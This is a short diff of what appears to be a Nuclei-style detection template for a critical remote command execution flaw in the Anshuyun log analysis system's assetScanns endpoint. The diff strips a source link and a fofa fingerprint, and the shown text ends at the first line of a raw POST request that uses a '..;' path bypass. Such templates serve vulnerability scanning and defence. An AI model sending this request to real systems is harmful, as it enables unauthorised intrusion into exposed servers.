@@ -3,12 +3,8 @@ info:
   name: 安数云综合日志分析系统 assetScanns 存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dgpq90vfb48m1gfa'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dgpq90vfb48m1gfa
-    fofa: icon_hash="-2008445303"
 http:
 - raw:
   - 'POST /js/..;/assetTopo/assetScanns HTTP/1.1
